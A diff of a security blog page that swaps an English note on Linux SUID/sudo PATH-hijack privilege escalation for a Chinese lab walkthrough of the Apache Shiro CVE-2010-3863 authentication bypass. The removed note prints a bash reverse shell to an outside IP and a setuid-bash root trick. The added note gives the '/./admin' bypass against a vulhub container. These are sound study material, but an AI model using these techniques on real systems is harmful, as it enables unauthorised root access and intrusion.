@@ -16,25 +16,27 @@
   <meta name="author" content="rightevil">
   <meta name="keywords" content="">
   
-    <meta name="description" content="a PE(privilege escalation) way in local linux using sudo,suid file">
+    <meta name="description" content="shiro各版本复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SUID,SUDO binary hijack">
-<meta property="og:url" content="https://rightevil.github.io/SUID,SUDO-binary-hijack/index.html">
+<meta property="og:title" content="shiro复现">
+<meta property="og:url" content="https://rightevil.github.io/shiro%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="rightevil">
-<meta property="og:description" content="a PE(privilege escalation) way in local linux using sudo,suid file">
+<meta property="og:description" content="shiro各版本复现">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-03-12T14:35:56.000Z">
-<meta property="article:modified_time" content="2024-03-12T15:12:42.197Z">
+<meta property="og:image" content="https://ibb.co/hR4TtjXh">
+<meta property="og:image" content="https://ibb.co/WWTn1pxX">
+<meta property="article:published_time" content="2025-04-04T07:24:17.000Z">
+<meta property="article:modified_time" content="2025-04-04T08:35:58.071Z">
 <meta property="article:author" content="rightevil">
-<meta property="article:tag" content="Linux">
-<meta property="article:tag" content="penetrate">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ibb.co/hR4TtjXh">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>SUID,SUDO binary hijack - rightevil</title>
+  <title>shiro复现 - rightevil</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -253,7 +255,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SUID,SUDO binary hijack"></span>
+            <span id="subtitle" data-typed-text="shiro复现"></span>
           
         </div>
 
@@ -264,8 +266,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-12 22:35" pubdate>
-          2024年3月12日 晚上
+        <time datetime="2025-04-04 15:24" pubdate>
+          2025年4月4日 下午
         </time>
       </span>
     
@@ -277,7 +279,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          1.3k 字
+          277 字
         
       </span>
     
@@ -289,7 +291,7 @@
         
         
           <!-- compatible with older versions-->
-          11 分钟
+          3 分钟
         
       </span>
     
@@ -335,30 +337,17 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SUID,SUDO binary hijack</h1>
+            <h1 style="display: none">shiro复现</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="find-the-suid-file"><a href="#find-the-suid-file" class="headerlink" title="find the suid file"></a>find the suid file</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
-<p>if it was in the list of GTFObins<br><em><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></em><br>so excute command follow GTFObins,if it not in the list.<br>use follow ways</p>
-<h1 id="Sudo-command-SUID-binary-without-command-path"><a href="#Sudo-command-SUID-binary-without-command-path" class="headerlink" title="Sudo command/SUID binary without command path"></a>Sudo command/SUID binary without command path</h1><p><strong>sudo:</strong><br>If the <strong>sudo permission</strong> is given to a single command <em>without specifying the path</em>: <strong>hacker10 ALL= (root) less</strong> you can exploit it by changing the PATH variable</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br><span class="hljs-comment">#Put your backdoor in /tmp and name it &quot;less&quot;</span><br>sudo less<br></code></pre></td></tr></table></figure>
-<p><strong>suid:</strong><br>using strings to check the suid file</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings reset_pass <br>···<br><span class="hljs-built_in">echo</span> john:john | chpasswd<br>···<br></code></pre></td></tr></table></figure>
-<p>in this binary file, it dont specify the command path,so we could inject the path</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=$(<span class="hljs-built_in">pwd</span>):<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
-<p>check the PATH</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/john:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin<br></code></pre></td></tr></table></figure>
-<p>and move the bound reverse-shell into this path(/home/john) and name it chpasswd(remember add x to the file)<br>bound reverse-shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.166.195/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
-<p>and excute the suid binary file.<br>or we could add a suid bash file</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;#!/bin/bash\ncp /bin/bash /dev/shm/bash\nchmod 4775 /dev/shm/bash&#x27;</span>&gt; chpasswd<br><span class="hljs-built_in">chmod</span> 777 chpasswd<br></code></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dev/shm/bash -p<br></code></pre></td></tr></table></figure>
-<p>if i meet new situation, i will update the article.</p>
-<h1 id="recommend-blog-or-material"><a href="#recommend-blog-or-material" class="headerlink" title="recommend blog or material"></a>recommend blog or material</h1><p><a target="_blank" rel="noopener" href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e">Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Medium</a></p>
-<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path">Linux Privilege Escalation | HackTricks | HackTricks</a></p>
-<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/suid-sgid-part-2-lpe/#Exploiting_SUID_Binaries_%E2%80%93_Shared_Object_Injection">SUID | SGID Part-2 – Linux Privilege Escalation</a></p>
+                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下漏洞都可以从vulhub下载<br>@<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/shiro">https://github.com/vulhub/vulhub/tree/master/shiro</a></p>
+<h1 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h1><p>影响版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt; 1.1.0<br>JSecurity 0.9.x<br></code></pre></td></tr></table></figure>
+<p>漏洞原理<br>shiro进行权限验证前未对url做标准化处理，可以通过构造/、//、/./、/../等绕过权限验证<br>docker启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2010-3863;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure>
+<p>访问ip:8080<br>正常请求/admin会跳转回登录页面<br><img src="https://ibb.co/hR4TtjXh" srcset="/img/loading.gif" lazyload><br>构造/./admin绕过验证<br><img src="https://ibb.co/WWTn1pxX" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -377,17 +366,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
-  
-  
-
-      </span>
-    
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/note/" class="category-chain-item">note</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
   
   
 
@@ -402,9 +381,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Linux/">#Linux</a>
-      
-        <a href="/tags/penetrate/">#penetrate</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
       
     </div>
   
@@ -416,8 +393,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SUID,SUDO binary hijack</div>
-      <div>https://rightevil.github.io/SUID,SUDO-binary-hijack/</div>
+      <div>shiro复现</div>
+      <div>https://rightevil.github.io/shiro复现/</div>
     </div>
     <div class="license-meta">
       
@@ -429,7 +406,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月12日</div>
+          <div>2025年4月4日</div>
         </div>
       
       
@@ -461,18 +438,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/vulnhub-wp-djinn/" title="vulnhub-wp djinn">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub-wp djinn</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SMB-SMTP-SNMP-enum/" title="SMB,SMTP,SNMP enum">
-                        <span class="hidden-mobile">SMB,SMTP,SNMP enum</span>
+                      <a href="/vulnhub-wp-katana/" title="vulnhub-wp katana">
+                        <span class="hidden-mobile">vulnhub-wp katana</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
